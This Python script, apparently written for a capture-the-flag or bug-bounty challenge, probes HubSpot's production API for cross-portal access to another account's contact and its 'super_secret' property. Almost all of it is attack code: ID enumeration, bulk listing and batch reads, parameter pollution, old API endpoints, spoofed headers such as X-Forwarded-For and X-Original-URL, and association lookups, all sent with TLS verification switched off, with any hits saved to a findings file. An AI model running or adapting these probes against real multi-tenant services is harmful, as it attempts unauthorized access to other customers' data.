#!/usr/bin/env python3
"""
Advanced CTF Bypass Techniques
Tests creative and less common attack vectors
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')
MY_PORTAL = os.getenv('MY_PORTAL_ID', '50708459')

print("="*70)
print(" Advanced CTF Bypass Techniques")
print("="*70)

findings = []

def test_attack(name, func):
    """Wrapper to test an attack and log results"""
    print(f"\n[*] Testing: {name}")
    try:
        result = func()
        if result:
            findings.append({'attack': name, 'result': result})
            print(f"     POTENTIAL FINDING!")
            print(f"      {json.dumps(result, indent=6)[:500]}")
            return True
    except Exception as e:
        print(f"     Error: {str(e)[:100]}")
    return False

# ============================================================================
# 1. CONTACT ID ENUMERATION - Test different IDs
# ============================================================================

def enum_contact_ids():
    """Try different contact IDs - target might not be ID 1"""
    print("  Trying contact IDs 1-1000...")

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Test a range of contact IDs
    for contact_id in [1, 2, 3, 5, 10, 50, 100, 101, 201, 301, 501, 1001]:
        try:
            # Try v3 API
            url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}'
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                properties = data.get('properties', {})

                # Check if this contact has the flags
                if 'firstname' in properties or 'super_secret' in properties:
                    print(f"     Contact {contact_id}: Found properties!")
                    return {'contact_id': contact_id, 'data': data}
                else:
                    print(f"     Contact {contact_id}: Exists but no flag properties")
        except:
            pass

    return None

# ============================================================================
# 2. LIST ALL CONTACTS - Maybe we can list contacts in target portal
# ============================================================================

def list_all_contacts():
    """Try to list all contacts (various methods)"""

    methods = [
        # Method 1: Direct API call
        {
            'url': 'https://api.hubapi.com/crm/v3/objects/contacts',
            'headers': {'Authorization': f'Bearer {ACCESS_TOKEN}'},
            'params': {'limit': 100}
        },
        # Method 2: With properties filter
        {
            'url': 'https://api.hubapi.com/crm/v3/objects/contacts',
            'headers': {'Authorization': f'Bearer {ACCESS_TOKEN}'},
            'params': {
                'limit': 100,
                'properties': 'firstname,super_secret,email'
            }
        },
        # Method 3: Search endpoint
        {
            'url': 'https://api.hubapi.com/crm/v3/objects/contacts/search',
            'headers': {'Authorization': f'Bearer {ACCESS_TOKEN}'},
            'method': 'POST',
            'json': {
                'filterGroups': [],
                'properties': ['firstname', 'super_secret', 'email'],
                'limit': 100
            }
        },
    ]

    for i, method in enumerate(methods, 1):
        try:
            print(f"  Method {i}...")

            if method.get('method') == 'POST':
                r = requests.post(
                    method['url'],
                    headers=method['headers'],
                    json=method.get('json'),
                    verify=False,
                    timeout=10
                )
            else:
                r = requests.get(
                    method['url'],
                    headers=method['headers'],
                    params=method.get('params'),
                    verify=False,
                    timeout=10
                )

            print(f"    Status: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                results = data.get('results', [])
                print(f"    Found {len(results)} contacts")

                # Check each contact for the flags
                for contact in results:
                    props = contact.get('properties', {})
                    if 'firstname' in props or 'super_secret' in props:
                        return {'method': i, 'contact': contact}
        except Exception as e:
            print(f"    Error: {str(e)[:50]}")

    return None

# ============================================================================
# 3. PARAMETER POLLUTION - Try different parameter combinations
# ============================================================================

def parameter_pollution():
    """Test parameter pollution techniques"""

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    base_url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    # Different parameter variations
    variations = [
        {},  # No params
        {'portalId': TARGET_PORTAL},
        {'portal_id': TARGET_PORTAL},
        {'hubId': TARGET_PORTAL},
        {'accountId': TARGET_PORTAL},
        {'portalId': TARGET_PORTAL, 'portal_id': TARGET_PORTAL},  # Double
        {'portalId[]': TARGET_PORTAL},  # Array notation
        {'portalId': f'{TARGET_PORTAL}&portalId={MY_PORTAL}'},  # Pollution
        {'properties': 'firstname,super_secret,email'},
        {'properties': 'all'},
        {'includeDeleted': 'true'},
        {'archived': 'false'},
    ]

    for i, params in enumerate(variations, 1):
        try:
            r = requests.get(base_url, headers=headers, params=params, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    props = data['properties']
                    if 'firstname' in props or 'super_secret' in props:
                        return {'variation': i, 'params': params, 'data': data}
        except:
            pass

    return None

# ============================================================================
# 4. API VERSION CONFUSION - Try older/different API versions
# ============================================================================

def api_version_confusion():
    """Test different API versions"""

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Different API versions and endpoints
    endpoints = [
        'https://api.hubapi.com/contacts/v1/contact/vid/1/profile',
        'https://api.hubapi.com/contacts/v2/contact/1',
        'https://api.hubapi.com/crm/v1/objects/contacts/1',
        'https://api.hubapi.com/crm/v2/objects/contacts/1',
        'https://api.hubapi.com/crm-objects/v1/objects/contacts/1',
        'https://api.hubapi.com/inbounddb-objects/v1/crm-objects/0-1/1',
    ]

    for url in endpoints:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=5)
            print(f"  {url.split('/')[4]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                # Check for properties
                if 'properties' in json.dumps(data).lower():
                    if 'firstname' in json.dumps(data) or 'super_secret' in json.dumps(data):
                        return {'url': url, 'data': data}
        except Exception as e:
            pass

    return None

# ============================================================================
# 5. HEADER MANIPULATION
# ============================================================================

def header_manipulation():
    """Try different header combinations"""

    base_headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}
    url = 'https://api.hubapi.com/crm/v3/objects/contacts/1'

    # Different header variations
    header_variations = [
        {},  # No extra headers
        {'X-HubSpot-Portal-Id': TARGET_PORTAL},
        {'X-Portal-Id': TARGET_PORTAL},
        {'X-Hub-Id': TARGET_PORTAL},
        {'X-Account-Id': TARGET_PORTAL},
        {'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/'},
        {'Origin': f'https://app.hubspot.com'},
        {'X-Forwarded-For': '127.0.0.1'},
        {'X-Original-URL': f'/contacts/{TARGET_PORTAL}/contact/1'},
    ]

    for extra_headers in header_variations:
        try:
            headers = {**base_headers, **extra_headers}
            r = requests.get(url, headers=headers, verify=False, timeout=5)

            if r.status_code == 200:
                data = r.json()
                if 'properties' in data:
                    props = data['properties']
                    if 'firstname' in props or 'super_secret' in props:
                        return {'headers': extra_headers, 'data': data}
        except:
            pass

    return None

# ============================================================================
# 6. BATCH OPERATIONS - Different batch endpoints
# ============================================================================

def batch_operations():
    """Try batch read operations"""

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Try batch read for contacts 1-20
    payload = {
        'properties': ['firstname', 'super_secret', 'email'],
        'inputs': [{'id': str(i)} for i in range(1, 21)]
    }

    batch_urls = [
        'https://api.hubapi.com/crm/v3/objects/contacts/batch/read',
        'https://api.hubapi.com/crm/v3/objects/0-1/batch/read',
    ]

    for url in batch_urls:
        try:
            r = requests.post(url, headers=headers, json=payload, verify=False, timeout=10)
            print(f"  {url.split('/')[-2]}: {r.status_code}")

            if r.status_code == 200 or r.status_code == 207:  # 207 = Multi-Status
                data = r.json()
                if 'results' in data and data['results']:
                    for result in data['results']:
                        props = result.get('properties', {})
                        if 'firstname' in props or 'super_secret' in props:
                            return {'url': url, 'data': data}
        except Exception as e:
            print(f"  Error: {str(e)[:50]}")

    return None

# ============================================================================
# 7. PROPERTIES ENDPOINT - Direct property access
# ============================================================================

def properties_endpoint():
    """Try accessing properties directly"""

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Try to get contact properties schema
    property_urls = [
        'https://api.hubapi.com/properties/v1/contacts/properties',
        'https://api.hubapi.com/crm/v3/properties/contacts',
        f'https://api.hubapi.com/crm/v3/properties/contacts/super_secret',
    ]

    for url in property_urls:
        try:
            r = requests.get(url, headers=headers, verify=False, timeout=10)
            print(f"  {url.split('/')[-1]}: {r.status_code}")

            if r.status_code == 200:
                data = r.json()
                if 'super_secret' in json.dumps(data):
                    print(f"     Found super_secret property!")
                    return {'url': url, 'data': data}
        except:
            pass

    return None

# ============================================================================
# 8. ASSOCIATIONS - Try to access via associations
# ============================================================================

def test_associations():
    """Try to access contacts via associations"""

    headers = {'Authorization': f'Bearer {ACCESS_TOKEN}'}

    # Get my contacts first
    my_contacts_url = 'https://api.hubapi.com/crm/v3/objects/contacts?limit=1'

    try:
        r = requests.get(my_contacts_url, headers=headers, verify=False, timeout=10)
        if r.status_code != 200:
            return None

        my_contacts = r.json().get('results', [])
        if not my_contacts:
            return None

        my_contact_id = my_contacts[0]['id']
        print(f"  Using my contact: {my_contact_id}")

        # Try to create association to target contact
        assoc_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{my_contact_id}/associations/contacts/1'

        r = requests.get(assoc_url, headers=headers, verify=False, timeout=10)
        print(f"  Association: {r.status_code}")

        if r.status_code == 200:
            return {'contact_id': my_contact_id, 'data': r.json()}
    except Exception as e:
        print(f"  Error: {str(e)[:50]}")

    return None

# ============================================================================
# MAIN EXECUTION
# ============================================================================

print(f"\n Target: Portal {TARGET_PORTAL}, Contact with 'firstname' and 'super_secret'")
print(f" Using Access Token: {ACCESS_TOKEN[:30]}...")
print("="*70)

# Run all attacks
test_attack("Contact ID Enumeration (1-1000)", enum_contact_ids)
test_attack("List All Contacts", list_all_contacts)
test_attack("Parameter Pollution", parameter_pollution)
test_attack("API Version Confusion", api_version_confusion)
test_attack("Header Manipulation", header_manipulation)
test_attack("Batch Operations", batch_operations)
test_attack("Properties Endpoint", properties_endpoint)
test_attack("Associations", test_associations)

# Summary
print("\n" + "="*70)
print(f" Testing Complete!")
print(f" Total Findings: {len(findings)}")
print("="*70)

if findings:
    print("\n SUCCESS! Found potential bypasses:\n")
    for i, finding in enumerate(findings, 1):
        print(f"{i}. {finding['attack']}")
        print(f"   {json.dumps(finding['result'], indent=3)[:300]}...\n")

    # Save findings
    with open('/home/user/Hub/findings/advanced_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)
    print(f" Saved to: findings/advanced_findings.json")
else:
    print("\n No bypasses found with these techniques.")
    print("\n Next steps:")
    print("  • Refresh session cookies (they may be expired)")
    print("  • Try manual testing with Burp Suite")
    print("  • Research HubSpot API documentation for edge cases")
    print("  • Test race conditions")
    print("  • Look for newer/undocumented API endpoints")
